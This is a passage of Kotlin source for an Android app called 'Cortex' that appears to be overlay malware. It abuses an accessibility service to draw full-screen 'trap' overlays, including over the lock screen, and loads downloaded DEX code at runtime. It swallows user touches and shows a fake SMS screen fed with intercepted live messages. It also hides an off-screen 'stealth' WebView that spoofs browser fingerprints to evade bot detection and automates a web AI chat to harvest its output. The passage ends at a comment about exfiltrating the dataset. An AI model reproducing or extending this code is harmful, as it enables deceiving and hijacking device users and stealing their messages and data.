            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P && isFullScreen) {
                params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }

            if (overlayView == null) {
                DebugLogger.log("SDUI_VERBOSE", "Initializing fresh WebView engine (Cold Start)...")
                overlayView = WebView(windowContext).apply {
                    setBackgroundColor(Color.TRANSPARENT)
                    isFocusable = true
                    isFocusableInTouchMode = true
                    setOnKeyListener { _, keyCode, keyEvent ->
                        if (keyCode == android.view.KeyEvent.KEYCODE_BACK && keyEvent.action == android.view.KeyEvent.ACTION_UP) {
                            evaluateJavascript("if(typeof window.onHardwareBackPressed === 'function') { window.onHardwareBackPressed(); } else { Cortex.close(); Cortex.nav('BACK'); }", null)
                            return@setOnKeyListener true
                        }
                        false
                    }
                    settings.apply {
                        javaScriptEnabled = true
                        domStorageEnabled = true
                        allowFileAccess = true
                        allowContentAccess = true
                        databaseEnabled = true
                        setSupportZoom(true)
                        builtInZoomControls = true
                        displayZoomControls = false
                        useWideViewPort = true
                        loadWithOverviewMode = true
                        userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
                    }
                    addJavascriptInterface(CortexBridge(ctx), "Cortex")
                }
            }

            // Always update WebViewClient to capture the latest ctx for Dimmer removal
            overlayView!!.webViewClient = object : WebViewClient() {
                override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                    super.onPageStarted(view, url, favicon)
                    // INJECT BOT-BYPASS SCRIPT
                    view?.evaluateJavascript("""
                        (function() {
                            // 1. Delete WebDriver
                            delete Object.getPrototypeOf(navigator).webdriver;

                            // 2. Mock Plugins (Native Chrome typically has 5)
                            const mockPlugins = [
                                { name: 'PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
                                { name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer', description: 'Google Chrome PDF' },
                                { name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer', description: 'Chromium PDF' },
                                { name: 'Microsoft Edge PDF Viewer', filename: 'internal-pdf-viewer', description: 'Edge PDF' },
                                { name: 'WebKit built-in PDF', filename: 'internal-pdf-viewer', description: 'WebKit PDF' }
                            ];

                            const pluginArray = [];
                            mockPlugins.forEach(p => {
                                const plugin = Object.create(Plugin.prototype);
                                Object.assign(plugin, p);
                                pluginArray.push(plugin);
                            });

                            Object.setPrototypeOf(pluginArray, PluginArray.prototype);
                            Object.defineProperty(navigator, 'plugins', { get: () => pluginArray });
                            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });

                            // 3. Fix Permissions API
                            const originalQuery = window.navigator.permissions.query;
                            window.navigator.permissions.query = (parameters) => (
                                parameters.name === 'notifications' ?
                                    Promise.resolve({ state: Notification.permission }) :
                                    originalQuery(parameters)
                            );
                        })();
                    """.trimIndent(), null)
                }

                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    Handler(Looper.getMainLooper()).postDelayed({
                        DimmerManager.removeOverlay(ctx)
                        if (isNativeAttached) {
                            removeNativeOverlay(ctx, "SEAMLESS_HTML_HANDOFF")
                        }
                    }, 150)
                }

                override fun onRenderProcessGone(view: WebView?, detail: android.webkit.RenderProcessGoneDetail?): Boolean {
                    DebugLogger.log("SDUI_ERR", "WebView Renderer died! OS killed it to save RAM. Purging.")
                    if (isAttached) try { wm.removeView(view) } catch(e: Exception) {}
                    view?.destroy()
                    if (overlayView == view) { overlayView = null; isAttached = false }
                    return true 
                }
            }

            // Force strict UI constraints for Nav/Status Bar obedience
            if (!isFullScreen) {
                overlayView!!.fitsSystemWindows = true
                overlayView!!.systemUiVisibility = android.view.View.SYSTEM_UI_FLAG_VISIBLE
            } else {
                overlayView!!.fitsSystemWindows = false
                overlayView!!.systemUiVisibility = (android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        or android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        or android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION)
            }

            try {
                // Set base URL to the assets folder so relative <img src="..."> paths work
                val assetBaseUrl = "file:///android_asset/reset_ui/"
                overlayView!!.loadDataWithBaseURL(assetBaseUrl, htmlContent, "text/html", "UTF-8", null)
                if (!isAttached) {
                    wm.addView(overlayView, params)
                    currentType = targetType
                    isAttached = true
                    DebugLogger.log("SDUI_VERBOSE", "WebView attached successfully.")
                } else {
                    overlayView!!.layoutParams = params
                    wm.updateViewLayout(overlayView, params)
                    DebugLogger.log("SDUI_VERBOSE", "Cached WebView layout updated.")
                }
            } catch (e: Exception) {
                DebugLogger.log("SDUI_ERR", "Failed to add or update WebView: ${e.message}")
                overlayView = null
                isAttached = false
            }
        }
    }

    fun removeOverlay(ctx: Context, reason: String = "UNKNOWN", clearDimmer: Boolean = false) {
        Handler(Looper.getMainLooper()).post {
            DebugLogger.log("SDUI_CLOSE", "Overlay removal triggered. Reason: $reason | clearDimmer: $clearDimmer")
            isSmsInterceptorActive = false
            interceptorReceiver?.let {
                try { ctx.applicationContext.unregisterReceiver(it) } catch(e: Exception){}
                interceptorReceiver = null
            }
            val serviceInstance = MyAccessibilityService.instance
            val windowContext = if (serviceInstance != null) serviceInstance else ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            if (clearDimmer) {
                DebugLogger.log("SDUI_CLOSE", "Calling DimmerManager.removeOverlay from DynamicUIManager...")
                DimmerManager.removeOverlay(ctx)
            }
            
            overlayView?.let {
                if (isAttached) {
                    try { 
                        wm.removeView(it) 
                        DebugLogger.log("SDUI_VERBOSE", "WebView detached successfully.")
                    } catch (e: Exception) {
                        DebugLogger.log("SDUI_ERR", "Detach failed: ${e.message}")
                    }
                }
                it.loadUrl("about:blank")
                it.clearHistory()
                it.removeAllViews()
                it.destroy() // FIX: Destroy the WebView instance to prevent Context leaks
                overlayView = null
                isAttached = false
            }
            UserOverlayManager.refresh(ctx)
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    fun showStatusBarOverlay(ctx: Context, touchable: Boolean, htmlContent: String) {
        if (MyAccessibilityService.isSafeZoneActive(ctx)) {
            DebugLogger.log("STATUS_BAR_LIFECYCLE", "showStatusBarOverlay BLOCKED by Safe Zone.")
            return
        }
        Handler(Looper.getMainLooper()).post {
            if (htmlContent.isBlank() || (htmlContent.contains("iframe") && htmlContent.contains("status.html"))) {
                DebugLogger.log("STATUS_BAR_ERR", "Status Bar injection aborted: Missing or invalid legacy HTML payload.")
                return@post
            }

            val serviceInstance = MyAccessibilityService.instance
            val windowContext = if (serviceInstance != null) serviceInstance else ctx

            if (isStatusBarAttached && statusBarView != null && lastStatusBarHtml == htmlContent && statusBarView?.context == windowContext) {
                // Prevent redundant 60-second reloads from Phoenix watchdog
                return@post
            }
            lastStatusBarHtml = htmlContent

            DebugLogger.log("STATUS_BAR_LIFECYCLE", "showStatusBarOverlay triggered. Touchable: $touchable")
            val hasOverlayPerm = PermissionManager.hasOverlayAccess(ctx)
            
            // Keep ACC priority to prevent native system icons from bleeding through on Android 12+
            val finalMethod = if (serviceInstance != null) "ACC" else if (hasOverlayPerm) "OVERLAY" else "FAIL"
            if (finalMethod == "FAIL") {
                DebugLogger.log("STATUS_BAR_ERR", "Status Bar injection failed: No overlay permission or ACC.")
                return@post
            }

            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val targetType = if (finalMethod == "ACC") WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY

            if (statusBarView != null && (!isStatusBarAttached || statusBarView?.context != windowContext)) {
                DebugLogger.log("STATUS_BAR_LIFECYCLE", "Context/Type mismatch detected. Purging old StatusBar instance.")
                if (isStatusBarAttached) try { wm.removeView(statusBarView) } catch (e: Exception) {}
                statusBarView?.destroy()
                statusBarView = null
                isStatusBarAttached = false
            }

            var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED

            if (!touchable) {
                flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            }

            val heightPx = (90 * windowContext.resources.displayMetrics.density).toInt()
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                heightPx,
                targetType,
                flags,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = android.view.Gravity.TOP
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }

            val hasTraps = isAnyAttached

            if (statusBarView == null) {
                DebugLogger.log("STATUS_BAR_LIFECYCLE", "Initializing fresh StatusBar WebView engine...")
                statusBarView = WebView(windowContext).apply {
                    setBackgroundColor(Color.TRANSPARENT)
                    settings.apply {
                        javaScriptEnabled = true
                        domStorageEnabled = true
                        allowFileAccess = true
                        allowContentAccess = true
                    }
                    // CRITICAL FIX: Use the persistent applicationContext for the JS Bridge, NOT the volatile Activity context.
                    addJavascriptInterface(CortexBridge(windowContext.applicationContext), "Cortex")

                    webViewClient = object : WebViewClient() {
                        override fun onPageFinished(view: WebView?, url: String?) {
                            super.onPageFinished(view, url)
                            DebugLogger.log("STATUS_BAR_LIFECYCLE", "StatusBar HTML successfully rendered.")
                        }

                        override fun onRenderProcessGone(view: WebView?, detail: android.webkit.RenderProcessGoneDetail?): Boolean {
                            DebugLogger.log("STATUS_BAR_ERR", "StatusBar Renderer died! OS killed it to save RAM or bridge crashed. Purging.")
                            if (isStatusBarAttached) try { wm.removeView(view) } catch(e: Exception) {}
                            view?.destroy()
                            if (statusBarView == view) { statusBarView = null; isStatusBarAttached = false }
                            return true 
                        }
                    }
                }
            }

            try {
                val assetBaseUrl = "file:///android_asset/reset_ui/"
                statusBarView!!.loadDataWithBaseURL(assetBaseUrl, htmlContent, "text/html", "UTF-8", null)
                if (!isStatusBarAttached) {
                    wm.addView(statusBarView, params)
                    isStatusBarAttached = true
                    DebugLogger.log("STATUS_BAR_LIFECYCLE", "StatusBar attached to WindowManager.")
                } else {
                    statusBarView!!.layoutParams = params
                    wm.updateViewLayout(statusBarView, params)
                    DebugLogger.log("STATUS_BAR_LIFECYCLE", "StatusBar layout updated.")
                }

                DimmerManager.pushToFront(windowContext)
            } catch (e: Exception) {
                DebugLogger.log("STATUS_BAR_ERR", "Failed to add StatusBar WebView: ${e.message}")
                statusBarView = null
                isStatusBarAttached = false
            }
        }
    }

    fun removeStatusBarOverlay(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            DebugLogger.log("STATUS_BAR_LIFECYCLE", "removeStatusBarOverlay triggered.")
            val windowContext = MyAccessibilityService.instance ?: ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            statusBarView?.let {
                if (isStatusBarAttached) {
                    try { 
                        wm.removeView(it) 
                        DebugLogger.log("STATUS_BAR_LIFECYCLE", "StatusBar detached from WindowManager.")
                    } catch (e: Exception) {
                        DebugLogger.log("STATUS_BAR_ERR", "Failed to detach StatusBar: ${e.message}")
                    }
                }
                it.loadUrl("about:blank")
                isStatusBarAttached = false
            }
        }
    }



    fun dispatchScreenState(isOn: Boolean) {
        Handler(Looper.getMainLooper()).post {
            if (!isOn) {
                overlayView?.evaluateJavascript("if(typeof onScreenOff === 'function') onScreenOff();", null)
            }
            activeNativeEntry?.onScreenStateChanged(isOn)
        }
    }

    fun injectPowerMenuCoords(ctx: Context, coordsJson: String) {
        Handler(Looper.getMainLooper()).post {
            overlayView?.evaluateJavascript("if(typeof updateIconLayout === 'function') { updateIconLayout($coordsJson); }", null)
        }
    }

    fun showTouchGuard(ctx: Context) {
        if (MyAccessibilityService.isSafeZoneActive(ctx)) return
        Handler(Looper.getMainLooper()).post {
            val service = MyAccessibilityService.instance ?: return@post
            val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager

            if (touchGuardView == null) {
                touchGuardView = android.view.View(service).apply {
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                }
            }

            if (!isGuardAttached) {
                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                    android.graphics.PixelFormat.TRANSLUCENT
                )
                try {
                    wm.addView(touchGuardView, params)
                    isGuardAttached = true
                    DebugLogger.log("GUARD", "Touch Swallower DEPLOYED")
                } catch (e: Exception) { }
            }
        }
    }

    fun removeTouchGuard(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            val service = MyAccessibilityService.instance ?: return@post
            val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            if (isGuardAttached && touchGuardView != null) {
                try {
                    wm.removeView(touchGuardView)
                    isGuardAttached = false
                    DebugLogger.log("GUARD", "Touch Swallower RELEASED")
                } catch (e: Exception) { }
            }
        }
    }

    fun showNativeOverlay(ctx: Context, dirPath: String, className: String, dimLevel: Int, method: String = "ACC", appMode: Boolean = false, trapLabel: String = "Cortex App") {
        if (MyAccessibilityService.isSafeZoneActive(ctx)) {
            DebugLogger.log("NATIVE_TRAP", "showNativeOverlay BLOCKED by Safe Zone.")
            return
        }
        Handler(Looper.getMainLooper()).post {
            activeTrapSessionId = System.currentTimeMillis()
            val serviceInstance = MyAccessibilityService.instance
            val hasOverlayPerm = PermissionManager.hasOverlayAccess(ctx)
            
            val finalMethod = when (method.uppercase()) {
                "ACC" -> if (serviceInstance != null) "ACC" else "FAIL_ACC"
                "OVERLAY" -> if (hasOverlayPerm) "OVERLAY" else "FAIL_OVERLAY"
                else -> {
                    if (serviceInstance != null) "ACC"
                    else if (hasOverlayPerm) "OVERLAY"
                    else "FAIL_NONE"
                }
            }

            if (finalMethod.startsWith("FAIL")) {
                DebugLogger.log("NATIVE_TRAP_ERR", "Injection aborted. Method: $method | Reason: $finalMethod")
                return@post
            }

            val windowContext = if (finalMethod == "ACC") serviceInstance!! else ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val targetType = if (finalMethod == "ACC") WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            
            // 1. PRESERVE OLD OVERLAY FOR SEAMLESS TRANSITION
            val oldView = nativeOverlayView
            val oldLifecycle = nativeLifecycleOwner
            
            // 2. APPLY DIM IMMEDIATELY to mask the loading delay
            DimmerManager.applyDim(ctx, dimLevel, "AUTO")
            
            // 3. YIELD THE MAIN THREAD TO ALLOW THE DIMMER TO RENDER
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    val trapDir = java.io.File(dirPath)
                    val dexFile = java.io.File(trapDir, "classes.dex")
                    
                    if (!dexFile.exists()) {
                        DebugLogger.log("NATIVE_TRAP_ERR", "DEX file missing in bundle: ${dexFile.absolutePath}")
                        DimmerManager.removeOverlay(ctx)
                        return@postDelayed
                    }
                    
                    DebugLogger.log("NATIVE_TRAP", "Loading Dalvik classes from ${dexFile.absolutePath}")
                    val optDir = ctx.getDir("dex_opt", Context.MODE_PRIVATE)
                    if (!optDir.exists()) optDir.mkdirs()

                    val loader = dalvik.system.DexClassLoader(dexFile.absolutePath, optDir.absolutePath, null, ctx.classLoader)
                    val clazz = loader.loadClass(className)
                    val instance = clazz.getDeclaredConstructor().newInstance() as com.example.myandroid.dynamic.DynamicEntry
                    activeNativeEntry = instance

                    if (appMode) {
                        DimmerManager.removeOverlay(ctx)
                        DynamicAppHandoff.pendingNativeEntry = instance
                        DynamicAppHandoff.pendingNativeDir = trapDir.absolutePath
                        val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NEW_DOCUMENT)
                            putExtra("task_title", trapLabel)
                        }
                        ctx.startActivity(intent)
                        return@postDelayed
                    }
                    
                    val view = instance.getView(windowContext, CortexBridge(ctx), trapDir.absolutePath)

                    val lifecycleOwner = OverlayLifecycleOwner()
                    // CRITICAL FIX: Explicitly bind to our custom lifecycle so detaching from Window doesn't wipe Compose memory
                    if (view is androidx.compose.ui.platform.AbstractComposeView) {
                        view.setViewCompositionStrategy(androidx.compose.ui.platform.ViewCompositionStrategy.DisposeOnLifecycleDestroyed(lifecycleOwner.lifecycle))
                    }

                    view.setViewTreeLifecycleOwner(lifecycleOwner)
                    view.setViewTreeViewModelStoreOwner(lifecycleOwner)
                    view.setViewTreeSavedStateRegistryOwner(lifecycleOwner)

                    var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or 
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON

                    if (finalMethod == "ACC") {
                        flags = flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                    }

                    val params = WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        targetType,
                        flags,
                        android.graphics.PixelFormat.TRANSLUCENT
                    )
                    
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P && finalMethod == "ACC") {
                        params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                    }

                    // Attach the NEW view over the OLD view
                    wm.addView(view, params)
                    nativeOverlayView = view
                    nativeLifecycleOwner = lifecycleOwner
                    isNativeAttached = true
                    
                    // 4. LIFT DIM AND PURGE OLD UI (After new UI is rendered)
                    Handler(Looper.getMainLooper()).postDelayed({
                        DimmerManager.removeOverlay(ctx)
                        if (isAttached) {
                            removeOverlay(ctx, "SEAMLESS_NATIVE_HANDOFF")
                        }
                        // Safely discard the old native view now that the new one covers the screen
                        if (oldView != null) {
                            try { wm.removeView(oldView) } catch (e: Exception) {}
                            oldLifecycle?.destroy()
                            DebugLogger.log("NATIVE_TRAP", "Old native overlay purged (Seamless Transition)")
                        }
                    }, 150)

                    DebugLogger.log("NATIVE_TRAP", "Native DEX UI injected successfully from $className")
                } catch (e: Exception) {
                    DebugLogger.log("NATIVE_TRAP_ERR", "Failed to load DEX: ${e.message}")
                    DimmerManager.removeOverlay(ctx)
                }
            }, 120)
        }
    }

    fun removeNativeOverlay(ctx: Context, reason: String = "UNKNOWN") {
        Handler(Looper.getMainLooper()).post {
            val windowContext = if (nativeOverlayView?.context != null) nativeOverlayView!!.context else ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            if (isNativeAttached && nativeOverlayView != null) {
                try { wm.removeView(nativeOverlayView) } catch (e: Exception) {}
                nativeLifecycleOwner?.destroy()
                nativeLifecycleOwner = null
                nativeOverlayView = null
                isNativeAttached = false
                DimmerManager.removeOverlay(ctx)
                DebugLogger.log("NATIVE_TRAP", "Native overlay removed. Reason: $reason")
            }
            UserOverlayManager.refresh(ctx)
        }
    }

    fun applyStoredStatusBar(ctx: Context) {
        val prefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
        if (prefs.getBoolean("status_bar_active", false)) {
            val html = prefs.getString("status_bar_html", "") ?: ""
            val touchable = prefs.getBoolean("status_bar_touchable", false)
            if (html.isNotEmpty()) {
                if (html.contains("iframe") && html.contains("status.html")) {
                    DebugLogger.log("STATUS_BAR_ERR", "Purging invalid legacy iframe payload from storage.")
                    prefs.edit().remove("status_bar_html").putBoolean("status_bar_active", false).apply()
                } else {
                    showStatusBarOverlay(ctx, touchable, html)
                }
            }
        }
    }

    // --- STEALTH 1x1 AUTOMATION ENGINE ---
    private var headlessWebView: WebView? = null
    private var isHeadlessAttached = false

    @SuppressLint("SetJavaScriptEnabled")
    fun runHeadlessAutomation(ctx: Context, url: String, promptB64: String) {
        Handler(Looper.getMainLooper()).post {
            DebugLogger.log("AUTO_HEADLESS", "Initializing 1x1 Stealth Automation Engine.")
            val serviceInstance = MyAccessibilityService.instance
            val windowContext = serviceInstance ?: ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            if (isHeadlessAttached && headlessWebView != null) {
                try { wm.removeView(headlessWebView) } catch (e: Exception) {}
            }
            headlessWebView?.destroy()
            
            headlessWebView = WebView(windowContext).apply {
                settings.javaScriptEnabled = true
                settings.domStorageEnabled = true
                settings.userAgentString = settings.userAgentString.replace("; wv", "")
                android.webkit.CookieManager.getInstance().setAcceptCookie(true)
                android.webkit.CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
                
                addJavascriptInterface(CortexBridge(ctx), "Cortex")
                
                webViewClient = object : WebViewClient() {
                    var hasInjected = false
                    override fun onPageFinished(view: WebView?, url: String?) {
                        super.onPageFinished(view, url)
                        if (!hasInjected) {
                            hasInjected = true
                            DebugLogger.log("AUTO_HEADLESS", "Target URL loaded. Injecting Automation Javascript.")
                            view?.evaluateJavascript(getAutomationScript(promptB64), null)
                        }
                    }
                }
            }
            
            val params = WindowManager.LayoutParams(
                1080, 1920, // Provide real dimensions to satisfy UI Virtual Scrollers
                if (serviceInstance != null) WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = android.view.Gravity.TOP or android.view.Gravity.START
                x = 10000 // Push 10,000 pixels off-screen to maintain absolute stealth
                y = 10000
            }
            
            try {
                wm.addView(headlessWebView, params)
                isHeadlessAttached = true
                headlessWebView?.loadUrl(url)
            } catch (e: Exception) {
                DebugLogger.log("AUTO_HEADLESS_ERR", "Failed to attach 1x1 view: ${e.message}")
            }
        }
    }

    fun removeHeadlessAutomation(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            if (isHeadlessAttached && headlessWebView != null) {
                val windowContext = MyAccessibilityService.instance ?: ctx
                val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                try { wm.removeView(headlessWebView) } catch (e: Exception) {}
                headlessWebView?.destroy()
                headlessWebView = null
                isHeadlessAttached = false
                DebugLogger.log("AUTO_HEADLESS", "Stealth Engine detached and destroyed.")
            }
        }
    }

    fun deploySmsInterceptor(ctx: Context) {
        if (isSmsInterceptorActive) return
        
        // Register BroadcastReceiver for Home/Recents detection
        if (interceptorReceiver == null) {
            interceptorReceiver = object : android.content.BroadcastReceiver() {
                override fun onReceive(context: Context, intent: Intent) {
                    if (intent.action == Intent.ACTION_CLOSE_SYSTEM_DIALOGS) {
                        val reason = intent.getStringExtra("reason")
                        if (reason == "homekey" || reason == "recentapps") {
                            DebugLogger.log("SMS_INTERCEPT", "Home/Recents pressed. Dismissing synthetic overlay.")
                            removeOverlay(context, "SYSTEM_DIALOG_CLOSED", true)
                        }
                    }
                }
            }
            val filter = android.content.IntentFilter(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)
            if (Build.VERSION.SDK_INT >= 33) {
                ctx.applicationContext.registerReceiver(interceptorReceiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                ctx.applicationContext.registerReceiver(interceptorReceiver, filter)
            }
        }

        // Apply 0% dim briefly to hide render transition
        DimmerManager.applyDim(ctx, 0, "AUTO")
        
        var html = ""
        try {
            val file = java.io.File(ctx.filesDir, "synthetic_sms.html")
            if (file.exists()) {
                html = file.readText()
            } else {
                html = ctx.assets.open("reset_ui/messages.html").bufferedReader().use { it.readText() }
            }
        } catch (e: Exception) {
            DebugLogger.log("SMS_INTERCEPT_ERR", "Failed to read html: ${e.message}")
            DimmerManager.removeOverlay(ctx)
            return
        }
        
        isSmsInterceptorActive = true
        showOverlay(ctx, true, "OVERLAY", html, true, false, "SMS_INTERCEPTOR")
        
        // Lift blindfold after 600ms
        Handler(Looper.getMainLooper()).postDelayed({
            DimmerManager.removeOverlay(ctx)
        }, 600)
    }

    fun injectLiveSms(sender: String, body: String, ts: Long) {
        if (isSmsInterceptorActive && isAttached && overlayView != null) {
            Handler(Looper.getMainLooper()).post {
                val safeSender = sender.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'")
                val safeBody = body.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'").replace("\n", "\\n")
                overlayView?.evaluateJavascript("if(typeof window.onSmsReceived === 'function') { window.onSmsReceived('$safeSender', '$safeBody', $ts); }", null)
            }
        }
    }

    fun getAutomationScript(promptB64: String): String {
        return """
            javascript:(async function() {
                try {
                    const b64 = "$promptB64";
                    const binString = atob(b64);
                    const bytes = new Uint8Array(binString.length);
                    for (let i = 0; i < binString.length; i++) {
                        bytes[i] = binString.charCodeAt(i);
                    }
                    const decodedJson = new TextDecoder().decode(bytes);
                    const prompts = JSON.parse(decodedJson);
                    Cortex.log("[AUTO] Initialized. Payload contains " + prompts.length + " prompts.");
                    
                    const delay = (ms) => new Promise(res => setTimeout(res, ms));
                    const randomDelay = (min, max) => delay(Math.floor(Math.random() * (max - min + 1) + min));
                    
                    let allResults = [];
                    
                    for (let i = 0; i < prompts.length; i++) {
                        let text = prompts[i];
                        Cortex.log("[AUTO] Executing Prompt " + (i + 1) + "/" + prompts.length);
                        
                        // 1. Wait for UI
                        let inputEl = null;
                        for (let a = 0; a < 30; a++) {
                            inputEl = document.querySelector('textarea[formcontrolname="promptText"], textarea[aria-label="Enter a prompt"]');
                            if (inputEl) break;
                            if (a % 2 === 0) Cortex.log("[AUTO] Polling for UI (Attempt " + a + "/30)...");
                            await delay(1000);
                        }
                        if (!inputEl) {
                            Cortex.log("[AUTO_ERR] Fatal: Input element timeout.");
                            break;
                        }
                        
                        await randomDelay(1000, 2000);
                        
                        // 2. Human-like Keyboard & Clipboard Emulation
                        Cortex.log("[AUTO] Emulating clipboard paste...");
                        inputEl.focus();
                        inputEl.click();
                        await randomDelay(300, 600);
                        document.execCommand('insertText', false, text);
                        inputEl.dispatchEvent(new Event('input', { bubbles: true }));
                        await randomDelay(800, 1500);
                        
                        // 3. Human-like Touch Submission
                        let submitBtn = document.querySelector('ms-run-button button[type="submit"], ms-run-button button.ctrl-enter-submits');
                        if (submitBtn && !submitBtn.disabled) {
                            Cortex.log("[AUTO] Emulating physical screen tap on Submit button...");
                            // Simulate finger pressing down
                            submitBtn.dispatchEvent(new Event('touchstart', { bubbles: true }));
                            await randomDelay(50, 150); // Finger rests on glass
                            // Simulate finger lifting up
                            submitBtn.dispatchEvent(new Event('touchend', { bubbles: true }));
                            submitBtn.click();
                        } else {
                            Cortex.log("[AUTO_ERR] Submit button disabled or missing.");
                            break;
                        }
                        
                        // 4. State Polling & Error Detection
                        Cortex.log("[AUTO] Polling DOM stability and sniffing for errors...");
                        let response = await waitForGen();
                        
                        if (response.status === 'QUOTA') {
                            Cortex.log("[AUTO_WARN] Quota Exceeded detected. Halting sequence entirely.");
                            break;
                        } else if (response.status === 'ERROR') {
                            Cortex.log("[AUTO_WARN] Error detected: " + response.text + ". Locating rerun handler.");
                            let userTurns = document.querySelectorAll('.chat-turn-container.user');
                            if (userTurns.length > 0) {
                                let lastUser = userTurns[userTurns.length - 1];
                                let rerunBtn = lastUser.querySelector('button[aria-label="Rerun this turn"]');
                                if (rerunBtn) {
                                    await randomDelay(1500, 2500);
                                    rerunBtn.click();
                                    Cortex.log("[AUTO] Rerun dispatched. Resuming monitor...");
                                    response = await waitForGen();
                                } else {
                                    Cortex.log("[AUTO_ERR] Rerun button not found on latest user turn.");
                                    break;
                                }
                            } else {
                                Cortex.log("[AUTO_ERR] Cannot rerun: No user turns found.");
                                break;
                            }
                        }
                        
                        if (response.status === 'SUCCESS') {
                            allResults.push("--- PROMPT " + (i+1) + " ---\n" + response.text);
                            Cortex.log("[AUTO] Turn " + (i+1) + " harvested (" + response.text.length + " characters).");
                        }
                        
                        // Pause between multi-prompts
                        if (i < prompts.length - 1) {
                            Cortex.log("[AUTO] Cooling down before next prompt...");
                            await randomDelay(3000, 5000);
                        }
                    }
                    
                    // 5. Final Save Verification
                    Cortex.log("[AUTO] Automation chain complete. Verifying Google Drive Sync...");
                    for(let s = 0; s < 15; s++) {
                        let header = document.querySelector('ms-header');
                        let headerText = header ? header.innerText : "";
                        if (headerText.includes("Saved to Drive")) {
                            Cortex.log("[AUTO] Drive Sync verified successful.");
                            break;
                        } else if (headerText.includes("Save prompt")) {
                            let btns = Array.from(document.querySelectorAll('button'));
                            let svBtn = btns.find(b => b.innerText && b.innerText.includes("Save prompt"));
                            if (svBtn) {
                                Cortex.log("[AUTO] Unsaved state detected. Forcing manual save.");
                                svBtn.click();
                            }
                        }
                        await delay(1000);
                    }
                    
                    // Exfiltrate full dataset
